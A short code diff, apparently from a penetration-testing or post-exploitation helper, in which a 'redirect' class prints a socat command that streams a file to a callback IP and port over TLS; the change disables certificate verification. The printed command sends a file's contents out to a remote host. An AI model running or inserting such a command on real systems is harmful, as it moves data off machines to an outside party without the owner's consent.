@@ -169,7 +169,7 @@ class redirect:
             if self.os == "linux":
                 print("If you want to check if they are there first")
                 print(f"which nc socat")
-                print(f"socat openssl:{self.cbip}:{self.cbport} - < {self.downfile} &")
+                print(f"socat openssl:{self.cbip}:{self.cbport},verify=0 - < {self.downfile} &")
             elif self.os == "windows":
                 print("powershell fu coming soon")
             else:
